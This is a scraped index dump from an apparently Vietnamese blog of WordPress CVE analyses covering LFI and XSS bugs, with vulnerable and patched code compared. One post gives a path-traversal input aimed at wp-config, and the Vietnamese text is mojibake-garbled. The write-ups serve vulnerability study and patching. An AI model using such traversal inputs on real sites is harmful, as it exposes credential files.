$view_file_name = str_replace( '-', '_', $view_file_name ); } } return $view_file_name; } Trong phi√™n b·∫£n vulnerable, page param ƒë∆∞·ª£c l·∫•y t·ª´ $_REQUEST do ng∆∞·ªùi d√πng ki·ªÉm so√°t nh∆∞ng kh√¥ng x√°c minh h·ª£p l·ªá c·ªßa t√™n file =\u003e Cho ph√©p Local File Inclusion. Trong h√†m n√†y ch·ªâ c√≥ c√°c logic lo·∫°i b·ªè c√°c k√Ω t·ª± HTML b·∫±ng sanitize_text_field v√† ki·ªÉm tra ti·ªÅn t·ªë opinionstage- sau ƒë√≥ lo·∫°i b·ªè ti·ªÅn t·ªë v√† thay - b·∫±ng _ n√™n attacker c√≥ th·ªÉ truy·ªÅn: ?page=opinionstage-../../wp-config B·∫£n v√°: private static function prepare_view_file_name_from_current_page() { if (empty($_REQUEST['page']) || !is_string($_REQUEST['page'])) { return ''; } $page = sanitize_text_field($_REQUEST['page']); if (substr($page, 0, strlen('opinionstage-')) !== 'opinionstage-') { return ''; } $template_name = substr($page, strlen('opinionstage-')); $template_name = str_replace('-', '_', $template_name); if (!in_array($template_name, self::$allowed_templates, true)) { return ''; } if (strpos($template_name, '..') !== false || strpos($template_name, '/') !== false || strpos($template_name, '\\\\') !== false) { return ''; } return $template_name; } B·∫£n v√° ƒë√£ b·ªï sung nhi·ªÅu l·ªõp b·∫£o v·ªá nh∆∞ ki·ªÉm tra ki·ªÉu d·ªØ li·ªáu, x√°c minh prefix \"opinionstage-\", √°p d·ª•ng whitelist (self::$allowed_templates), ngƒÉn traversal k√Ω t·ª± nguy hi·ªÉm Vulnerable Code H√†m prepare_view_file_name_form_current_page() ƒë∆∞·ª£c g·ªçi t·ª´ load_template() public static function load_template() { $view_file_name = self::prepare_view_file_name_form_current_page(); if ( !$view_file_name ) { return; } $os_client_logged_in = Helper::is_user_logged_in(); $os_options = Helper::get_opinionstage_option(); TemplatesViewer::require_template( 'admin/views/' . $view_file_name, compact( 'os_client_logged_in', 'os_options' ) ); } require_template() ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë 'admin/views/'.$view_file_name public static function require_template($template_name, $args = []) { $path = Opinionstage::get_instance()-\u003eplugin_path . $template_name . '.php'; if( ! file_exists( $path ) ) { return; } extract($args); require( $path ); } require() h√†m ch√≠nh g√¢y LFI ƒë∆∞·ª£c g·ªçi v·ªõi ƒë·ªëi s·ªë $path l√† gi√° tr·ªã concat t·ª´ ƒë∆∞·ªùng d·∫´n c·ªßa plugin (plugin_path), $template_name, .php public function register_menu_page() { if ( function_exists( 'add_menu_page' ) ) { $os_client_logged_in = Helper::is_user_logged_in(); if ( $os_client_logged_in ) { add_menu_page( __( 'Opinion Stage', 'social-polls-by-opinionstage' ), __( 'Op","date":"2025-10-12","objectID":"/vi/posts/2025-10-12-cve-2025-53328/:0:0","tags":["analyst","plugin","lfi"],"title":"CVE-2025-53328 Analysis \u0026 POC","uri":"/vi/posts/2025-10-12-cve-2025-53328/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng Stored Cross Site Scripting(XSS) x·∫£y ra tr√™n WordPress Core tr∆∞·ªõc phi√™n b·∫£n 6.8.3. Nguy√™n nh√¢n do sai x·ª≠ l√Ω ƒë·∫ßu v√†o khi sinh trang web ƒë·ªông, t√°c ƒë·ªông ƒë·∫øn ch·ª©c nƒÉng t·∫°o menu (nav menus) CVE ID: CVE-2025-58674 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 6.8.2 Patched Versions: 6.8.3 CVSS severity: Low (5.9) Required Privilege: Author Product: WordPressCore Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Wordpress Core Versions: v6.8.2 (vulnerable) v√† v6.8.3 (patched). Diff Tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Theme - Astra: Theme r·∫•t ph·ªï bi·∫øn v·ªõi ng∆∞·ªùi d√πng WordPress, h·ªó tr·ª£ t·∫°o nav memu nhanh ch√≥ng. Analysis WordPress l√† ph·∫ßn m·ªÅm m√£ ngu·ªìn m·ªü, c√≥ kho l∆∞u tr·ªØ n·∫±m ·ªü github n√™n ta c√≥ th·ªÉ t√¨m ƒë·∫øn commit li√™n quan ƒë·∫øn s·ª± ki·ªán v√° l·ªó h·ªïng XSS ƒë·ªÉ quan s√°t s·ª± thay ƒë·ªïi, hi·ªÉu ƒë∆∞·ª£c l·ªó h·ªïng x·∫£y ra ·ªü ƒë√¢u. Patch diff B·∫£n l·ªói: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), $html = '', $selected = '', currentItemID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val(), currentparentID = parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val(), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = [ currentItemID ]; if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = childItem.find( '.menu-item-data-db-id' ).val(); excludeMenuItem.push( childID ); }); } if ( currentparentID == 0 ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"0\"\u003e' + wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ) + '\u003c/option\u003e'; $.each( menuItems, function() { var menuItem = $(this), $selected = '', menuID = menuItem.find( '.menu-item-data-db-id' ).val(), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { if ( currentparentID == menuID ) { $selected = 'selected'; } $html += '\u003coption ' + $selected + ' value=\"' + menuID + '\"\u003e' + menuTitle + '\u003c/option\u003e'; } }); parentDropdown.html( $html ); }); }); }, Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã menuTitle ƒë∆∞·ª£c ch√®n v√†o th·∫ª \u003coption\u003e v√† ƒë∆∞·ª£c hi·ªÉn th·ªã ra HTML b·∫±ng ph∆∞∆°ng th·ª©c html() c·ªßa jQuery m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ngƒÉn ch·∫∑n XSS n√†o. H√†m html() d√πng ƒë·ªÉ thay th·∫ø n·ªôi dung HTML b√™n trong ph·∫ßn t·ª≠ hi·ªán t·∫°i, n√™n n·∫øu menuTitle ch·ª©a m√£ ƒë·ªôc th√¨ m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi tr√™n tr√¨nh duy·ªát. B·∫£n v√°: updateParentDropdown : function() { return this.each(function(){ var menuItems = $( '#menu-to-edit li' ), parentDropdowns = $( '.edit-menu-item-parent' ); $.each( parentDropdowns, function() { var parentDropdown = $( this ), currentItemID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-db-id' ).val() ), currentParentID = parseInt( parentDropdown.closest( 'li.menu-item' ).find( '.menu-item-data-parent-id' ).val() ), currentItem = parentDropdown.closest( 'li.menu-item' ), currentMenuItemChild = currentItem.childMenuItems(), excludeMenuItem = /** @type {number[]} */ [ currentItemID ]; parentDropdown.empty(); if ( currentMenuItemChild.length \u003e 0 ) { $.each( currentMenuItemChild, function(){ var childItem = $(this), childID = parseInt( childItem.find( '.menu-item-data-db-id' ).val() ); excludeMenuItem.push( childID ); }); } parentDropdown.append( $( '\u003coption\u003e', { value: '0', selected: currentParentID === 0, text: wp.i18n._x( 'No Parent', 'menu item without a parent in navigation menu' ), } ) ); $.each( menuItems, function() { var menuItem = $(this), menuID = parseInt( menuItem.find( '.menu-item-data-db-id' ).val() ), menuTitle = menuItem.find( '.edit-menu-item-title' ).val(); if ( ! excludeMenuItem.includes( menuID ) ) { parentDropdown.append( $( '\u003coption\u003e'","date":"2025-10-11","objectID":"/vi/posts/2025-10-11-cve-2025-58674/:0:0","tags":["analyst","core","xss"],"title":"CVE-2025-58674 Analysis \u0026 POC","uri":"/vi/posts/2025-10-11-cve-2025-58674/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WooCommerce Plugin.","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info Plugin WooCommerce cho WordPress c√≥ l·ªó h·ªïng Cross-Site Scripting (XSS) d·ª±a tr√™n PostMessage th√¥ng qua trang ‚Äòcustomize-store‚Äô ·ªü t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 9.4.2, do vi·ªác x·ª≠ l√Ω d·ªØ li·ªáu PostMessage ch∆∞a ƒë·ªß an to√†n (kh√¥ng l·ªçc ƒë·∫ßu v√†o v√† kh√¥ng escape d·ªØ li·ªáu khi xu·∫•t ra). ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ch√®n c√°c ƒëo·∫°n script t√πy √Ω v√†o trang web, m√† s·∫Ω th·ª±c thi n·∫øu h·ªç l·ª´a ƒë∆∞·ª£c ng∆∞·ªùi d√πng th·ª±c hi·ªán m·ªôt h√†nh ƒë·ªông, v√≠ d·ª• nh∆∞ click v√†o m·ªôt li√™n k·∫øt. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) v√† 9.4.3 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff Trong phi√™n b·∫£n vulnerable, attachParentListeners() l·∫Øng nghe t·∫•t c·∫£ c√°c message t·ª´ b·∫•t k·ª≥ ngu·ªìn n√†o m√† kh√¥ng ki·ªÉm tra origin, d·ªØ li·ªáu t·ª´ message ƒë∆∞·ª£c g√°n tr·ª±c ti·∫øp v√†o DOM d·∫´n ƒë·∫øn nguy c∆° PostMessage-Based XSS (sub-type c·ªßa DOM-based XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=‚Äúclient/admin/client/customize-store/utils.js v9.4.2‚Äù} Trong phi√™n b·∫£n patched, m√£ ƒë√£ b·ªï sung nhi·ªÅu l·ªõp ki·ªÉm tra v√† h·∫°n ch·∫ø so v·ªõi phi√™n b·∫£n vulnerable, chuy·ªÉn t·ª´ ‚Äúch·∫•p nh·∫≠n m·ªçi message v√† redirect th·∫≥ng‚Äù sang ‚Äúch·ªâ ch·∫•p nh·∫≠n message ƒë√°ng tin, x√°c th·ª±c c·∫•u tr√∫c v√† ki·ªÉm tra URL tr∆∞·ªõc khi ƒëi·ªÅu h∆∞·ªõng‚Äù export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=‚Äúclient/admin/client/customize-store/utils.js v9.4.3‚Äù} Diff ‚Äî So s√°nh thay ƒë·ªïi m√£ ngu·ªìn gi·ªØa phi√™n b·∫£n vulnerable v√† b·∫£n patched Vulnerable code Tuy ƒë√£ t√¨m ra source v√† sink, nh∆∞ng khi ph√¢n t√≠ch m√£ ngu·ªìn c·ªßa plugin sau khi upload t√¥i l·∫°i kh√¥ng t√¨m ƒë∆∞·ª£c h√†m attachParentListeners() K·∫øt qu·∫£ t√¨m ki·∫øm attachParentListeners() T√¥i nghƒ© m√¨nh ƒë√£ setup sai n√™n code kh√¥ng ƒë∆∞·ª£c t·∫£i v·ªÅ ƒë·∫ßy ƒë·ªß. Nh∆∞ng kh√¥ng, khi t√¨m v·ªõi t·ª´ kh√≥a \"navigate\" t√¥i nh·∫≠n ƒë∆∞·ª£c h√†m kh√°c t√™n c√≥ ch·ª©c nƒÉng t∆∞∆°ng t·ª± attachParentListeners() K·∫øt qu·∫£ t√¨m ki·∫øm ‚Äônavigate' üëâ Trong b·∫£n product, ƒë·ªÉ t·ªëi ∆∞u h√≥a th·ªùi gian t·∫£i d·ªØ li·ªáu v·ªÅ tr√¨nh duy·ªát, plugin ƒë√£ d√πng k·ªπ thu·∫≠t minification lo·∫°i b·ªè kho·∫£ng tr·∫Øng, ƒë·∫∑t t√™n h√†m, bi·∫øn ng·∫Øn v√† m·ªôt ph·∫ßn obfuscation l√†m cho m√£ kh√≥ ƒë·ªçc h∆°n. File ƒë∆∞·ª£c t·∫£i v·ªÅ c√≥ t√™n 5292.js ch·ª© kh√¥ng ph·∫£i utils.js. Sau khi l√†m ƒë·∫πp code, t√¥i th·∫•y 5292.js ch·ª©a m√£ c·ªßa utils.js v√† nhi·ªÅu m√£ t·ª´ c√°c file kh√°c. Truy c·∫≠p trang customize-store v√† th·ª≠ g·ª≠i postMessage b·∫±ng console c·ªßa tr√¨nh duy·ªát http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store S·ª± k","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info WordPress Core d·ªÖ b·ªã Stored Cross-Site Scripting th√¥ng qua t√™n hi·ªÉn th·ªã ng∆∞·ªùi d√πng trong Avatar block ·ªü nhi·ªÅu phi√™n b·∫£n ƒë·∫øn 6.5.2 do insufficient output escaping tr√™n display name. ƒêi·ªÅu n√†y cho ph√©p authenticated attackers, c√≥ quy·ªÅn contributor-level access tr·ªü l√™n, inject arbitrary web scripts v√†o c√°c trang ‚Äî nh·ªØng script n√†y s·∫Ω th·ª±c thi m·ªói khi ng∆∞·ªùi d√πng truy c·∫≠p trang ƒë√£ b·ªã ch√®n. Ngo√†i ra, n√≥ c≈©ng cho ph√©p unauthenticated attackers inject arbitrary web scripts v√†o nh·ªØng trang c√≥ comment block v√† hi·ªÉn th·ªã comment author‚Äôs avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) v√† 6.4.4 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis Patch diff Trong phi√™n b·∫£n vulnerable, WP Core ƒë√£ s·ª≠ d·ª•ng esc_attr__() ƒë·ªÉ d·ªãch chu·ªói v√† escape HTML attribute tr∆∞·ªõc khi hi·ªÉn th·ªã ra browser, nh∆∞ng ƒë√£ tri·ªÖn khai sai c√°ch. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; esc_attr__() sau khi d·ªãch chu·ªói v√† escape HTML th√¨ m·ªõi ƒë∆∞a v√†o sprintf() ƒë·ªÉ ch√®n bi·∫øn $author_name =\u003e $author_name kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω. Trong phi√™n b·∫£n patched, $author_name ƒë∆∞·ª£c ƒë∆∞a v√†o sprintf() tr∆∞·ªõc v√† sau ƒë√≥ m·ªõi ƒë∆∞·ª£c escape HTML b·∫±ng esc_attr() =\u003e an to√†n tr∆∞·ªõc XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; So s√°nh s·ª± thay ƒë·ªïi gi·ªØa b·∫£n l·ªói v√† b·∫£n v√° Vulnerable code function render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] ) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } Avatar block l√† 1 block c·ªßa Block Editor d√πng ƒë·ªÉ t·∫°o n·ªôi dung cho post ho·∫∑c comment trong WordPress. $author_name l√† display_name c·ªßa author c√≥ $author_id thu·ªôc v·ªÅ post hi·ªán t·∫°i. N·∫øu ƒë√¢y l√† post v√† c√≥ link th√¨ $author_name ch·ª©a payload s·∫Ω th√™m v√†o attribute aria-label v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát. Khi truy c·∫≠p m·ªôt post b·∫•t k·ª≥, wp() ƒë∆∞·ª£c g·ªçi l√† l·∫•y d·ªØ li·ªáu c·ªßa post ƒë√≥. N∆°i b·∫Øt ƒë·∫ßu l·∫•y d·ªØ li·ªáu t·ª´ post hi·ªán t·∫°i function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } T·∫°i ƒë√¢y $wp_query m·ªõi ƒë∆∞·ª£c t·∫°o v√† n√≥ s·∫Ω ch·ª©a gi√° tr·ªã c·ªßa wp_post sau khi query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() s·∫Ω parse_request v√† th·ª±c hi·ªán query l·∫•y th√¥ng tin post hi·ªán t·∫°i b·∫±ng query_posts() L·∫•y th√¥ng tin post b·∫±ng query_post() $wp_the_query l√† ƒë·ªëi t∆∞·ª£ng WP_Query ch√≠nh c·ªßa WordPress, c√≤n $wp_query ch·ªâ ƒë∆°n gi·∫£n l√† m·ªôt tham chi·∫øu (reference) tr·ªè ƒë·∫øn $wp_the_query. V√¨ v·∫≠y, khi $wp_the_query ƒë√£ ƒë∆∞·ª£c kh·ªüi t·∫°o v√† c√≥ d·ªØ li·ªáu, th√¨ $wp_query c≈©ng s·∫Ω c√≥ c√πng gi√° tr·ªã. Gi√° tr·ªã tham chi·∫øu c·ªßa $wp_query Ta c√≥ ƒë∆∞·ª£c gi√° tr·ªã post_content: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar thu·ªôc lo·∫°i block core/avatar H√†m render() s·∫Ω g·ªçi ƒë·∫øn call_user_func() v·ªõi callback l√† render_block_core_av","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:0:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"content":"CVE \u0026 Basic Info WP Statistics ‚Äì The Most Popular Privacy-Friendly Analytics Plugin cho WordPress m·∫Øc l·ªó h·ªïng Stored Cross-Site Scripting (XSS) qua User-Agent Header trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn 14.5.4 (bao g·ªìm c·∫£ 14.5.4). Nguy√™n nh√¢n xu·∫•t ph√°t t·ª´ vi·ªác ki·ªÉm tra v√† l·ªçc d·ªØ li·ªáu ƒë·∫ßu v√†o c≈©ng nh∆∞ tho√°t d·ªØ li·ªáu ƒë·∫ßu ra ch∆∞a ƒë·∫ßy ƒë·ªß. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ch√®n c√°c ƒëo·∫°n m√£ JavaScript ƒë·ªôc h·∫°i v√†o h·ªá th·ªëng. C√°c ƒëo·∫°n m√£ n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi m·ªói khi ng∆∞·ªùi d√πng truy c·∫≠p v√†o trang c√≥ ch·ª©a d·ªØ li·ªáu ƒë√£ b·ªã ch√®n m√£ ƒë·ªôc, g√¢y ra nguy c∆° nghi√™m tr·ªçng cho b·∫£o m·∫≠t v√† quy·ªÅn ri√™ng t∆∞. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin Requirements Local WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) v√† v14.15.5 (patched). Diff tool - Meld ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n. Analysis T√¥i ƒë√£ thi·∫øu s√≥t trong qu√° tr√¨nh thu th·∫≠p th√¥ng tin v·ªÅ CVE n√†y, references c·ªßa https://www.cve.org/CVERecord?id=CVE-2025-9816 ch·ªâ r√µ n∆°i l·ªó h·ªóng x·∫£y ra: includes/admin/templates/pages/devices/models.php{: .filepath} Nh∆∞ng t√¥i ƒë√£ b·ªè qua n√≥ v√† s·ª≠ d·ª•ng Meld ƒë·ªÉ so s√°nh code. Do code thay ƒë·ªïi kh√° nhi·ªÅu n√™n t√¥i ƒë√£ ch·ªß ƒë·ªông t√¨m c√°c file li√™n quan ƒë·∫øn user-agent Diff ‚Äî so s√°nh thay ƒë·ªïi m√£ gi·ªØa b·∫£n vulnerable v√† b·∫£n v√° V√† code thay ƒë·ªïi trong UserAgent.php{: .filepath} l√†m t√¥i tin r·∫±ng l·ªó h·ªóng th·ª±c s·ª± x·∫£y ra ·ªü ƒë√¢y. Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong UserAgent.php N√≥ l√†m t√¥i t·ªën kh√° nhi·ªÅu th·ªùi gian nh∆∞ng ch∆∞a th·ªÉ ph√¢n t√≠ch ƒë∆∞·ª£c. Tuy nhi√™n, vi·ªác n√†y c≈©ng gi√∫p √≠ch cho qu√° tr√¨nh ph√¢n t√≠ch. üçÄ May m·∫Øn thay, d∆∞·ªõi s·ª± h∆∞·ªõng d·∫´n c·ªßa c√°c ti·ªÅn b·ªëi, t√¥i ƒë√£ focus v√†o ƒë√∫ng v√†o v·ªã tr√≠ l·ªó h·ªïng. N√™n qu√° tr√¨nh ph√¢n t√≠ch tr·ªü n√™n d·ªÖ d√†ng h∆°n. Tip: ƒê√¢y l√† l·ªó h·ªïng Cross Site Script di·ªÖn ra ·ªü tr√¨nh duy·ªát c·ªßa n·∫°n nh√¢n n√™n ta c·∫ßn t√¨m n∆°i render v√† tr·∫£ v·ªÅ HTML. Patch diff L·ªó h·ªïng x·∫£y ra trong file includes/admin/templates/pages/devices/models.php{: .filepath} t·∫°i d√≤ng 31. Trong phi√™n b·∫£n vulnerable, $item-\u003emodel ƒë∆∞·ª£c in ra HTML nh∆∞ng kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá n√†o \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e Trong phi√™n b·∫£n patched, $item-\u003emodel ƒë√£ ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng c√°ch ƒë·∫∑t n√≥ v√†o esc_attr() v√† esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e üëâ B·∫£n v√° b·ªï sung l·ªõp l·ªçc ƒë·∫ßu v√†o cho $item-\u003emodel, ƒë·∫£m b·∫£o n√≥ s·∫Ω ƒë∆∞·ª£c escape tr∆∞·ªõc khi in ra HTML. Diff ‚Äî S·ª± thay ƒë·ªïi m√£ trong models.php Vulnerable code \u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e N·∫øu $data kh√¥ng r·ªóng th√¨ duy·ªát qua $data v√† hi·ªÉn th·ªã d·ªØ li·ªáu ƒë√£ th·ªëng k√™ c·ªßa visitors, bao g·ªìm model. N·∫øu r·ªóng th√¨ in ra No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; }","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:0:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"content":"Security Vulnerability in WordPress All in One Time Clock Lite Plugin.","date":"2025-10-07","objectID":"/vi/posts/2025-10-07-cve-2025-6832/","tags":["analyst","core","xss"],"title":"CVE-2025-6832 Analysis \u0026 POC","uri":"/vi/posts/2025-10-07-cve-2025-6832/"},{"categories":["CVE Analyst"],"content":"L·ªó h·ªïng Reflected Cross-Site Scripting (XSS) trong plugin All in One Time Clock Lite cho WordPress. L·ªó h·ªïng xu·∫•t ph√°t t·ª´ tham s·ªë nonce ·ªü c√°c phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 2.0, do x·ª≠ l√Ω ƒë·∫ßu v√†o kh√¥ng ƒë·∫ßy ƒë·ªß v√† kh√¥ng escape ƒë·∫ßu ra. K·∫ª t·∫•n c√¥ng (k·ªÉ c·∫£ kh√¥ng x√°c th·ª±c) c√≥ th·ªÉ ch√®n c√°c ƒëo·∫°n script t√πy √Ω v√†o trang; nh·ªØng script n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi n·∫°n nh√¢n 